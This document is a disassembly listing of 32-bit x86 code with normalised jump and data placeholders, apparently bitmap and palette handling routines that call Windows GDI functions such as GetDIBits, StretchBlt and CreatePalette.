mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_42499c
call sub_423d18
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423d18
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_42499c
call sub_423d18
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_425558
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_403bc8
call sub_403bc8
jmp r-xdata
sub_427585
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_427594
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_403b44
call sub_403b98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_4275f4
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_427658
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_426b4c
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_427853
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_425558
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_425558
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_425558
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42780b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_426f90
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_427864
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4266c0
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_426dbc
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_4278cc
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax esi
call sub_427fdc
mov eax [ esi + 0x28 ]
call sub_426dc0
mov eax [ esi + 0x2c ]
call sub_403368
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418e88
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_427908
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4279c0
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402d24
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42824c
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_426dbc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_426dc0
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418eb4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_4279f8
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_427fdc
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_427a87
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_4275f4
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_426f90
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_42824c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_427a8c
mov eax [ ebp - 0x8 ]
call sub_423448
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_403b44
call sub_403b98
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_427ab8
push ebx
mov ebx eax
mov eax ebx
call sub_427dac
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40d490
pop ebx
retn
sub_427ae8
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_41ad9c
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_427fdc
lea eax [ ebx + 0x2c ]
call sub_40d490
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_42824c
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_427b5c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_425240
mov eax ebx
call sub_4280ec
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_427ee8
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_427d98
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_42516c
push eax
call SetStretchBltMode
mov eax ebx
call sub_427e2c
mov dl [ r-xdata ]
call sub_425240
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_42808c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_427e2c
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427d9f
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_427d2d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_425558
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_427e2c
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4256fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_427dac
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_427fec
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4279f8
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_4254b0
sub_427e2c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_427fec
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_426bc8
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_427ab8
sub_427e74
push ebx
mov ebx eax
mov eax ebx
call sub_427fdc
mov eax ebx
call sub_427fec
mov edx ebx
mov eax ebx
call sub_427ab8
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_427e98
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_427f18
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_423d18
mov eax ebx
call sub_427ee8
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_427e2c
xor edx edx
pop ecx
call sub_4250f8
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_427f68
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_4280ec
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_426f90
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_427fec
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_41ad38
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_42806f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_42808c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_427fdc
mov eax ebx
call sub_427fec
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_427f18
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_427658
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_426b4c
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_4280ec
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_425c48
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_426b4c
push 0x0
call GetDC
call sub_425558
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_4281a4
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_42542c
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_4279f8
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_427fdc
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402d24
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_428228
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_41ad18
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_4288dc
pop esi
pop ebx
retn
sub_42824c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push j_sub_403830#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_403518
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_428333
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_426dc0
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_426dbc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42833a
push rw-data
call LeaveCriticalSection
retn
sub_42834c
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_4288dc
pop edx
pop edi
pop esi
pop ebx
retn
sub_428374
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_4026ec
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_428891
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_428864
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402d24
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_425444
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
